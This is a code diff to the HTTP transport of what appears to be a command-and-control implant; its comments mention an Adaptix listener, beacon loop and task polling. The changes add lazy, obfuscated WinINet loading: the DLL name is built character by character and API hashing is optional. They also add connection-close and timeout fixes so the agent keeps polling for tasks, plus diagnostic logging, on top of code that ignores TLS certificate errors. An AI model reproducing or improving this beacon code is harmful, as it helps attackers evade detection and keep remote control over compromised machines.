@@ -11,8 +11,63 @@
 #define DIRECT_HTTPS_LAZY_HTTP_SEND 0
 #endif
 
+#ifndef DIRECT_HTTPS_LAZY_WININET_INIT
+#define DIRECT_HTTPS_LAZY_WININET_INIT 0
+#endif
+
 #ifndef DIRECT_HTTPS_WININET_INIT_ORDER
 #define DIRECT_HTTPS_WININET_INIT_ORDER 0
+#endif
+
+#ifndef DIRECT_HTTPS_MEMORY_LOADER_DIAG
+#define DIRECT_HTTPS_MEMORY_LOADER_DIAG 0
+#endif
+
+#if DIRECT_HTTPS_MEMORY_LOADER_DIAG
+static void ConnectorDiagLog(LPCSTR text)
+{
+	CHAR path[MAX_PATH] = { 0 };
+	DWORD n = GetEnvironmentVariableA("MMPP_LOADER_LOG", path, sizeof(path));
+	if (!n || n >= sizeof(path) || !text)
+		return;
+	HANDLE h = CreateFileA(path, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (h == INVALID_HANDLE_VALUE)
+		return;
+	DWORD written = 0;
+	WriteFile(h, text, StrLenA((CHAR*)text), &written, NULL);
+	WriteFile(h, "\r\n", 2, &written, NULL);
+	CloseHandle(h);
+}
+
+static void ConnectorDiagLogU32(LPCSTR prefix, ULONG value)
+{
+	CHAR buf[96] = { 0 };
+	ULONG off = 0;
+	if (prefix) {
+		while (prefix[off] && off < sizeof(buf) - 1) {
+			buf[off] = prefix[off];
+			off++;
+		}
+	}
+	CHAR digits[16] = { 0 };
+	ULONG d = 0;
+	if (value == 0) {
+		digits[d++] = '0';
+	}
+	else {
+		while (value && d < sizeof(digits)) {
+			digits[d++] = (CHAR)('0' + (value % 10));
+			value /= 10;
+		}
+	}
+	while (d && off < sizeof(buf) - 1)
+		buf[off++] = digits[--d];
+	buf[off] = 0;
+	ConnectorDiagLog(buf);
+}
+#else
+#define ConnectorDiagLog(...) ((void)0)
+#define ConnectorDiagLogU32(...) ((void)0)
 #endif
 
 
@@ -74,6 +129,7 @@ ConnectorHTTP::ConnectorHTTP()
 	this->functions->GetProcAddress = ApiWin->GetProcAddress;
 	this->functions->GetLastError = ApiWin->GetLastError;
 
+	#if !DIRECT_HTTPS_LAZY_WININET_INIT
 	CHAR wininet_c[12];
 	wininet_c[0]  = HdChrA('w');
 	wininet_c[1]  = HdChrA('i');
@@ -148,6 +204,103 @@ ConnectorHTTP::ConnectorHTTP()
 		this->functions->InternetReadFile           = (decltype(InternetReadFile)*)           GetSymbolAddress(this->hWininetModule, HASH_FUNC_INTERNETREADFILE);
 #endif
 	}
+	#endif
+}
+
+// EnsureWininetApis 在首次实际请求前加载 WinINet 并解析基础 API。
+BOOL ConnectorHTTP::EnsureWininetApis()
+{
+	if (!this->functions)
+		return FALSE;
+
+	if (!this->hWininetModule) {
+		CHAR wininet_c[12];
+		wininet_c[0]  = HdChrA('w');
+		wininet_c[1]  = HdChrA('i');
+		wininet_c[2]  = HdChrA('n');
+		wininet_c[3]  = HdChrA('i');
+		wininet_c[4]  = HdChrA('n');
+		wininet_c[5]  = HdChrA('e');
+		wininet_c[6]  = HdChrA('t');
+		wininet_c[7]  = HdChrA('.');
+		wininet_c[8]  = HdChrA('d');
+		wininet_c[9]  = HdChrA('l');
+		wininet_c[10] = HdChrA('l');
+		wininet_c[11] = HdChrA(0);
+		this->hWininetModule = this->functions->LoadLibraryA(wininet_c);
+	}
+	if (!this->hWininetModule)
+		return FALSE;
+
+#if DIRECT_HTTPS_NO_API_HASHING
+#if DIRECT_HTTPS_WININET_INIT_ORDER == 1
+	this->functions->InternetReadFile           = (decltype(InternetReadFile)*)           this->functions->GetProcAddress(this->hWininetModule, "InternetReadFile");
+	this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*) this->functions->GetProcAddress(this->hWininetModule, "InternetQueryDataAvailable");
+	this->functions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)             this->functions->GetProcAddress(this->hWininetModule, "HttpQueryInfoA");
+	this->functions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)        this->functions->GetProcAddress(this->hWininetModule, "InternetCloseHandle");
+	this->functions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)         this->functions->GetProcAddress(this->hWininetModule, "InternetSetOptionA");
+	this->functions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)       this->functions->GetProcAddress(this->hWininetModule, "InternetQueryOptionA");
+	this->functions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)           this->functions->GetProcAddress(this->hWininetModule, "HttpOpenRequestA");
+	this->functions->InternetConnectA           = (decltype(InternetConnectA)*)           this->functions->GetProcAddress(this->hWininetModule, "InternetConnectA");
+	this->functions->InternetOpenA              = (decltype(InternetOpenA)*)              this->functions->GetProcAddress(this->hWininetModule, "InternetOpenA");
+#if !DIRECT_HTTPS_LAZY_HTTP_SEND
+	this->functions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)           this->functions->GetProcAddress(this->hWininetModule, "HttpSendRequestA");
+#endif
+#elif DIRECT_HTTPS_WININET_INIT_ORDER == 2
+#if !DIRECT_HTTPS_LAZY_HTTP_SEND
+	this->functions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)           this->functions->GetProcAddress(this->hWininetModule, "HttpSendRequestA");
+#endif
+	this->functions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)        this->functions->GetProcAddress(this->hWininetModule, "InternetCloseHandle");
+	this->functions->InternetOpenA              = (decltype(InternetOpenA)*)              this->functions->GetProcAddress(this->hWininetModule, "InternetOpenA");
+	this->functions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)             this->functions->GetProcAddress(this->hWininetModule, "HttpQueryInfoA");
+	this->functions->InternetConnectA           = (decltype(InternetConnectA)*)           this->functions->GetProcAddress(this->hWininetModule, "InternetConnectA");
+	this->functions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)       this->functions->GetProcAddress(this->hWininetModule, "InternetQueryOptionA");
+	this->functions->InternetReadFile           = (decltype(InternetReadFile)*)           this->functions->GetProcAddress(this->hWininetModule, "InternetReadFile");
+	this->functions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)           this->functions->GetProcAddress(this->hWininetModule, "HttpOpenRequestA");
+	this->functions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)         this->functions->GetProcAddress(this->hWininetModule, "InternetSetOptionA");
+	this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*) this->functions->GetProcAddress(this->hWininetModule, "InternetQueryDataAvailable");
+#else
+	this->functions->InternetOpenA              = (decltype(InternetOpenA)*)              this->functions->GetProcAddress(this->hWininetModule, "InternetOpenA");
+	this->functions->InternetConnectA           = (decltype(InternetConnectA)*)           this->functions->GetProcAddress(this->hWininetModule, "InternetConnectA");
+	this->functions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)           this->functions->GetProcAddress(this->hWininetModule, "HttpOpenRequestA");
+#if !DIRECT_HTTPS_LAZY_HTTP_SEND
+	this->functions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)           this->functions->GetProcAddress(this->hWininetModule, "HttpSendRequestA");
+#endif
+	this->functions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)         this->functions->GetProcAddress(this->hWininetModule, "InternetSetOptionA");
+	this->functions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)       this->functions->GetProcAddress(this->hWininetModule, "InternetQueryOptionA");
+	this->functions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)             this->functions->GetProcAddress(this->hWininetModule, "HttpQueryInfoA");
+	this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*) this->functions->GetProcAddress(this->hWininetModule, "InternetQueryDataAvailable");
+	this->functions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)        this->functions->GetProcAddress(this->hWininetModule, "InternetCloseHandle");
+	this->functions->InternetReadFile           = (decltype(InternetReadFile)*)           this->functions->GetProcAddress(this->hWininetModule, "InternetReadFile");
+#endif
+#else
+	this->functions->InternetOpenA              = (decltype(InternetOpenA)*)              GetSymbolAddress(this->hWininetModule, HASH_FUNC_INTERNETOPENA);
+	this->functions->InternetConnectA           = (decltype(InternetConnectA)*)           GetSymbolAddress(this->hWininetModule, HASH_FUNC_INTERNETCONNECTA);
+	this->functions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)           GetSymbolAddress(this->hWininetModule, HASH_FUNC_HTTPOPENREQUESTA);
+#if !DIRECT_HTTPS_LAZY_HTTP_SEND
+	this->functions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)           GetSymbolAddress(this->hWininetModule, HASH_FUNC_HTTPSENDREQUESTA);
+#endif
+	this->functions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)         GetSymbolAddress(this->hWininetModule, HASH_FUNC_INTERNETSETOPTIONA);
+	this->functions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)       GetSymbolAddress(this->hWininetModule, HASH_FUNC_INTERNETQUERYOPTIONA);
+	this->functions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)             GetSymbolAddress(this->hWininetModule, HASH_FUNC_HTTPQUERYINFOA);
+	this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*) GetSymbolAddress(this->hWininetModule, HASH_FUNC_INTERNETQUERYDATAAVAILABLE);
+	this->functions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)        GetSymbolAddress(this->hWininetModule, HASH_FUNC_INTERNETCLOSEHANDLE);
+	this->functions->InternetReadFile           = (decltype(InternetReadFile)*)           GetSymbolAddress(this->hWininetModule, HASH_FUNC_INTERNETREADFILE);
+#endif
+
+	BOOL ready = this->functions->InternetOpenA &&
+		this->functions->InternetConnectA &&
+		this->functions->HttpOpenRequestA &&
+		this->functions->InternetSetOptionA &&
+		this->functions->InternetQueryOptionA &&
+		this->functions->HttpQueryInfoA &&
+		this->functions->InternetQueryDataAvailable &&
+		this->functions->InternetCloseHandle &&
+		this->functions->InternetReadFile;
+#if !DIRECT_HTTPS_LAZY_HTTP_SEND
+	ready = ready && this->functions->HttpSendRequestA;
+#endif
+	return ready;
 }
 
 // EnsureHttpSendRequestA 在真正要发送 HTTP 请求前，按需解析 HttpSendRequestA。
@@ -161,6 +314,8 @@ BOOL ConnectorHTTP::EnsureHttpSendRequestA()
 	if (this->functions && this->functions->HttpSendRequestA)
 		return TRUE;
 	if (!this->functions)
+		return FALSE;
+	if (!this->EnsureWininetApis())
 		return FALSE;
 
 	if (!this->hWininetModule) {
@@ -200,7 +355,12 @@ BOOL ConnectorHTTP::SetProfile(void* profilePtr, BYTE* beat, ULONG beatSize)
 	ULONG param_length    = StrLenA((CHAR*)profile.parameter);
 	ULONG headers_length  = StrLenA((CHAR*)profile.http_headers);
 
-	CHAR* HttpHeaders = (CHAR*)this->functions->LocalAlloc(LPTR, param_length + enc_beat_length + headers_length + 5);
+	CHAR connectionCloseHeader[] = {
+		'C','o','n','n','e','c','t','i','o','n',':',' ','c','l','o','s','e','\r','\n', 0
+	};
+	ULONG close_header_length = StrLenA(connectionCloseHeader);
+
+	CHAR* HttpHeaders = (CHAR*)this->functions->LocalAlloc(LPTR, param_length + enc_beat_length + headers_length + close_header_length + 5);
 	memcpy(HttpHeaders, profile.http_headers, headers_length);
 	ULONG index = headers_length;
 	memcpy(HttpHeaders + index, profile.parameter, param_length);
@@ -211,6 +371,8 @@ BOOL ConnectorHTTP::SetProfile(void* profilePtr, BYTE* beat, ULONG beatSize)
 	index += enc_beat_length;
 	HttpHeaders[index++] = '\r';
 	HttpHeaders[index++] = '\n';
+	memcpy(HttpHeaders + index, connectionCloseHeader, close_header_length);
+	index += close_header_length;
 	HttpHeaders[index++] = 0;
 
 	memset(encBeat, 0, enc_beat_length);
@@ -294,6 +456,8 @@ DWORD ConnectorHTTP::ProbeRequestStage(ULONG stage, BOOL forcePlainHttp8000)
 {
 	this->recvSize = 0;
 	this->recvData = 0;
+	if (!this->EnsureWininetApis())
+		return 1580;
 
 	DWORD context = 0;
 	BOOL result = FALSE;
@@ -337,7 +501,11 @@ DWORD ConnectorHTTP::ProbeRequestStage(ULONG stage, BOOL forcePlainHttp8000)
 
 	CHAR acceptTypes[] = { '*', '/', '*', 0 };
 	LPCSTR rgpszAcceptTypes[] = { acceptTypes, 0 };
-	DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_COOKIES;
+	// Do not request a persistent HTTP connection here.  The Adaptix listener can
+	// reply without a Content-Length for empty task polls; with keep-alive enabled
+	// WinINet may keep the socket established and the agent blocks in the read
+	// path after the first check-in instead of returning to the beacon loop.
+	DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_COOKIES;
 	if (targetSsl)
 		flags |= INTERNET_FLAG_SECURE;
 
@@ -354,6 +522,9 @@ DWORD ConnectorHTTP::ProbeRequestStage(ULONG stage, BOOL forcePlainHttp8000)
 		dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REVOCATION | SECURITY_FLAG_IGNORE_WRONG_USAGE;
 		this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
 	}
+	DWORD ioTimeoutMs = 5000;
+	this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_RECEIVE_TIMEOUT, &ioTimeoutMs, sizeof(ioTimeoutMs));
+	this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_SEND_TIMEOUT, &ioTimeoutMs, sizeof(ioTimeoutMs));
 
 	if (!forcePlainHttp8000 && this->proxy_type != PROXY_TYPE_NONE && this->proxy_username != NULL) {
 		this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_PROXY_USERNAME, this->proxy_username, StrLenA(this->proxy_username));
@@ -462,6 +633,8 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 {
 	this->recvSize = 0;
 	this->recvData = 0;
+	if (!this->EnsureWininetApis())
+		return;
 
 	ULONG attempt = 0;
 	BOOL  connected = FALSE;
@@ -499,23 +672,30 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 			{
 				CHAR acceptTypes[] = { '*', '/', '*', 0 };
 				LPCSTR rgpszAcceptTypes[] = { acceptTypes, 0 };
-				DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_COOKIES;
+					// Do not request a persistent HTTP connection here.  See the
+					// ProbeRequestStage flag construction above for the runtime
+					// symptom this avoids: first check-in succeeds, then the agent
+					// remains stuck on an established socket and never polls tasks.
+					DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_COOKIES;
 				if (this->ssl)
 					flags |= INTERNET_FLAG_SECURE;
 
 				CHAR* currentUri = this->uris[this->uri_index];
 				HINTERNET hRequest = this->functions->HttpOpenRequestA(this->hConnect, this->http_method, currentUri, 0, 0, rgpszAcceptTypes, flags, (DWORD_PTR)&context);
 				if (hRequest) {
-					if (this->ssl) {
-						DWORD dwFlags = 0;
-						DWORD dwBuffer = sizeof(DWORD);
-						result = this->functions->InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &dwBuffer);
-						if (!result) {
-							dwFlags = 0;
+						if (this->ssl) {
+							DWORD dwFlags = 0;
+							DWORD dwBuffer = sizeof(DWORD);
+							result = this->functions->InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &dwBuffer);
+							if (!result) {
+								dwFlags = 0;
+							}
+							dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REVOCATION | SECURITY_FLAG_IGNORE_WRONG_USAGE;
+							this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
 						}
-						dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REVOCATION | SECURITY_FLAG_IGNORE_WRONG_USAGE;
-						this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
-					}
+						DWORD ioTimeoutMs = 5000;
+						this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_RECEIVE_TIMEOUT, &ioTimeoutMs, sizeof(ioTimeoutMs));
+						this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_SEND_TIMEOUT, &ioTimeoutMs, sizeof(ioTimeoutMs));
 
 					if (this->proxy_type != PROXY_TYPE_NONE && this->proxy_username != NULL) {
 						this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_PROXY_USERNAME, this->proxy_username, StrLenA(this->proxy_username));
@@ -582,6 +762,7 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 					}
 
 					if (!this->EnsureHttpSendRequestA()) {
+						ConnectorDiagLogU32("HTTP_SEND_RESOLVE_FAIL=", this->functions->GetLastError());
 						if (tmpHeaders) {
 							memset(tmpHeaders, 0, StrLenA(tmpHeaders));
 							this->functions->LocalFree(tmpHeaders);
@@ -599,6 +780,10 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 					}
 
 					connected = this->functions->HttpSendRequestA(hRequest, reqHeaders, (DWORD)StrLenA(reqHeaders), (LPVOID)data, (DWORD)data_size);
+					if (connected)
+						ConnectorDiagLog("HTTP_SEND_OK");
+					else
+						ConnectorDiagLogU32("HTTP_SEND_FAIL=", this->functions->GetLastError());
 
 					if (tmpHeaders) {
 						memset(tmpHeaders, 0, StrLenA(tmpHeaders));
@@ -608,15 +793,25 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 						char statusCode[255];
 						DWORD statusCodeLenght = 255;
 						BOOL result = this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE, statusCode, &statusCodeLenght, 0);
+						if (result)
+							ConnectorDiagLogU32("HTTP_STATUS=", (ULONG)_atoi(statusCode));
+						else
+							ConnectorDiagLogU32("HTTP_STATUS_QUERY_FAIL=", this->functions->GetLastError());
 
 						if (result && _atoi(statusCode) == 200) {
 							DWORD answerSize = 0;
 							DWORD dwLengthDataSize = sizeof(DWORD);
 							result = this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &answerSize, &dwLengthDataSize, NULL);
+							ConnectorDiagLogU32("HTTP_CONTENT_QUERY_OK=", result ? 1 : 0);
 
 							if (result) {
+								ConnectorDiagLogU32("HTTP_CONTENT_LENGTH=", answerSize);
 								DWORD dwNumberOfBytesAvailable = 0;
 								result = this->functions->InternetQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable, 0, 0);
+								if (result)
+									ConnectorDiagLogU32("HTTP_AVAILABLE=", dwNumberOfBytesAvailable);
+								else
+									ConnectorDiagLogU32("HTTP_AVAILABLE_FAIL=", this->functions->GetLastError());
 
 								if (result && answerSize > 0) {
 									ULONG numberReadedBytes = 0;
@@ -632,9 +827,11 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 									}
 									this->recvSize = numberReadedBytes;
 									this->recvData = buffer;
+									ConnectorDiagLogU32("HTTP_RECV_SIZE=", numberReadedBytes);
 								}
 							}
 							else if (this->functions->GetLastError() == ERROR_HTTP_HEADER_NOT_FOUND) {
+								ConnectorDiagLog("HTTP_CONTENT_LENGTH_MISSING");
 								ULONG numberReadedBytes = 0;
 								DWORD readedBytes = 0;
 								BYTE* buffer = (BYTE*)this->functions->LocalAlloc(LPTR, 0);
@@ -656,6 +853,7 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 								if (numberReadedBytes) {
 									this->recvSize = numberReadedBytes;
 									this->recvData = buffer;
+									ConnectorDiagLogU32("HTTP_RECV_SIZE=", numberReadedBytes);
 								}
 								else {
 									this->functions->LocalFree(buffer);
